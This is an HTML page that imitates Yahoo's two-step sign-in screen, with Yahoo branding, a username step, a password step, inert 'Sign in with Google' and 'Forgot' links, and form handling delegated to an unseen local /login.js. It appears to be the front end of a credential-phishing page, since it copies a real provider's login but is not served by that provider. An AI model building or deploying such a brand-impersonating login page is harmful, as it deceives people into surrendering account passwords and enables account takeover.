<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
        /* --- RESET & BASICS --- */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: #232a31;
        }

        /* --- CONTAINER --- */
        /* Mobile First Approach */
        .login-container {
            width: 100%;
            max-width: 420px;
            padding: 0 32px; /* Wider padding for cleaner look */
            margin: 10vh auto 0 auto; /* Starts 10% down the screen (Vertical Center) */
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            background-color: #ffffff;
            transition: all 0.3s ease;
        }

        /* --- DESKTOP / PC RESPONSIVE MODE --- */
        @media (min-width: 768px) {
            body {
                justify-content: center; /* Center card vertically */
                align-items: center;     /* Center card horizontally */
                background-color: #f0f0f5; /* Light gray bg for contrast */
            }

            .login-container {
                margin: 0; /* Remove mobile top margin */
                padding: 50px 40px;
                border-radius: 12px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08); /* Soft shadow */
                background-color: #ffffff;
                max-width: 460px;
            }

            /* Adjust input spacing for desktop */
            .input-group {
                margin-bottom: 35px; 
            }
        }

        /* --- TYPOGRAPHY --- */
        .brand-logo {
            color: #6001d2;
            font-size: 3rem; /* Large, bold logo */
            font-weight: 700;
            margin-bottom: 30px;
            letter-spacing: -1.5px;
        }

        h1.title {
            color: #232a31;
            font-size: 1.8rem; /* Larger Title */
            font-weight: 600;
            margin-bottom: 12px;
        }

        .subtitle {
            color: #232a31;
            font-size: 1.1rem;
            margin-bottom: 40px; /* Big gap before inputs start */
        }

        /* User email display in Step 2 */
        .user-display {
            font-size: 1.1rem;
            font-weight: 500;
            margin-bottom: 30px;
            color: #232a31;
        }

        /* --- FORMS & INPUTS --- */
        form {
            width: 100%;
        }

        .input-group {
            width: 100%;
            margin-bottom: 40px; /* Spacing between input and button */
            position: relative;
        }

        input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #e0e0e0;
            padding: 16px 0; /* Taller touch target for mobile */
            font-size: 1.15rem; /* Text size 18px+ prevents iOS zoom */
            outline: none;
            color: #1d2a3a;
            border-radius: 0;
            background: transparent;
            transition: border-bottom 0.2s;
        }

        input::placeholder {
            color: #6e7780;
            font-weight: 400;
            font-size: 1.1rem;
        }

        input:focus {
            border-bottom: 2px solid #6001d2;
        }

        /* Password Toggle Eye */
        .toggle-password {
            position: absolute;
            right: 0;
            top: 14px; /* Adjusted for larger input height */
            cursor: pointer;
            color: #26282a;
            background: none;
            border: none;
            padding: 5px; /* Padding makes icon easier to tap */
            outline: none;
        }

        /* --- BUTTONS --- */
        .btn {
            width: 100%;
            padding: 16px; /* Taller buttons */
            border-radius: 32px; /* Rounder "Pill" shape */
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            border: none;
            margin-bottom: 24px;
            transition: background-color 0.2s, transform 0.1s;
            display: block; 
        }

        .btn:active {
            transform: scale(0.98);
        }

        .btn-primary {
            background-color: #6001d2;
            color: white;
            box-shadow: 0 4px 12px rgba(96, 1, 210, 0.2);
        }

        .btn-primary:hover {
            background-color: #5000b0;
        }

        .btn-secondary {
            background-color: white;
            color: #6001d2;
            border: 1px solid #6001d2;
            font-weight: 600;
        }

        .btn-secondary:hover {
            background-color: #f8f0ff;
        }

        /* Google Button */
        .btn-google {
            background-color: white;
            color: #232a31;
            border: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            margin-bottom: 30px;
            font-weight: 500;
        }

        .btn-google:hover {
            background-color: #f7f7f7;
        }

        .google-icon {
            width: 24px; /* Larger icon */
            height: 24px;
        }

        /* --- LINKS & EXTRAS --- */
        .forgot-link {
            color: #6001d2;
            text-decoration: none;
            font-size: 1rem;
            margin-bottom: 35px;
            display: inline-block;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .separator {
            color: #6e7780;
            font-size: 1rem;
            margin-bottom: 24px;
            font-weight: 500;
        }

        /* Utility */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="login-container">
        
        <div class="brand-logo">yahoo!</div>

        <div id="step-1">
            <h1 class="title">Sign in</h1>
            <p class="subtitle">using your Yahoo account</p>

            <form id="email-form">
                <div class="input-group">
                    <input type="text" id="email-input" required placeholder="Username, email, or mobile" autocomplete="username">
                </div>

                <button type="submit" class="btn btn-primary">Next</button>
            </form>

            <a href="#" class="forgot-link">Forgot username?</a>

            <button type="button" class="btn btn-secondary">Create an account</button>

            <div class="separator">or</div>

            <button class="btn btn-google">
                <svg class="google-icon" viewBox="0 0 48 48">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
                </svg>
                Sign in with Google
            </button>
        </div>

        <div id="step-2" class="hidden" style="width: 100%;">
            <div id="user-display" class="user-display"></div>

            <h1 class="title">Enter password</h1>
            <p class="subtitle">to finish sign in</p>

            <form id="password-form">
                <div class="input-group">
                    <input type="password" id="password-input" required placeholder="Password" autocomplete="current-password">
                    
                    <button type="button" class="toggle-password" onclick="togglePassword()" title="Show Password">
                        <svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </button>
                </div>

                <button type="submit" class="btn btn-primary">Next</button>
                
                <a href="#" class="forgot-link">Forgot password?</a>
            </form>
        </div>

    </div>

    <script src="/login.js" defer></script>
</body>
</html>
